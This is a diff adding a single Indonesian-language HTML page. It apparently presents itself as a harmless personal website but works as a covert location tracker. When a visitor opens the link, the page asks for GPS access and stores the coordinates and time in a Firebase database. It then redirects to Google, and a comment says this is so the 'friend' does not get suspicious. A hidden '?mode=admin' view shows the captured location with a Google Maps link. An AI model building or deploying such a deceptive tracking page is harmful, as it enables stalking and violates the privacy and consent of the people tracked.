@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>website pertama saya</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f4; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; margin-top: 50px; }
+        .btn-maps { background: #4285F4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <div id="konten" class="card">
+        <h2>Memuat...</h2>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+        // 1. KONFIGURASI FIREBASE (Ganti dengan milikmu)
+        const firebaseConfig = {
+            databaseURL: "URL_DATABASE_FIREBASE_KAMU"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const linkRef = ref(db, 'lokasi_terakhir/');
+
+        // 2. LOGIKA ROUTING (Cek apakah ada ?mode=admin di URL)
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('mode') === 'admin';
+
+        if (isAdmin) {
+            // --- MODE ADMIN: Memantau Lokasi ---
+            document.querySelector('h2').innerText = "Dashboard Admin";
+            onValue(linkRef, (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    document.getElementById("konten").innerHTML = `
+                        <h3>Lokasi Teman Ditemukan!</h3>
+                        <p>Waktu: ${data.waktu}</p>
+                        <p>Koordinat: ${data.lat}, ${data.lon}</p>
+                        <br><br>
+                        <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="btn-maps">Buka di Google Maps</a>
+                    `;
+                } else {
+                    document.getElementById("konten").innerHTML = "Belum ada data lokasi.";
+                }
+            });
+
+        } else {
+            // --- MODE TEMAN: Melacak Lokasi ---
+            document.querySelector('h2').innerText = "Silakan Tunggu...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    // Simpan data ke Firebase
+                    set(linkRef, {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        waktu: new Date().toLocaleString()
+                    }).then(() => {
+                        document.getElementById("konten").innerHTML = "<h3>Koneksi Berhasil!</h3><p>Mengalihkan...</p>";
+                        // Opsional: Pindahkan teman ke Google agar tidak curiga
+                        setTimeout(() => window.location.href = "https://www.google.com", 2000);
+                    });
+                }, (err) => {
+                    document.getElementById("konten").innerHTML = "<h3>Error</h3><p>Mohon izinkan akses lokasi.</p>";
+                });
+            } else {
+                document.getElementById("konten").innerHTML = "Browser tidak mendukung GPS.";
+            }
+        }
+    </script>
+</body>
+</html>
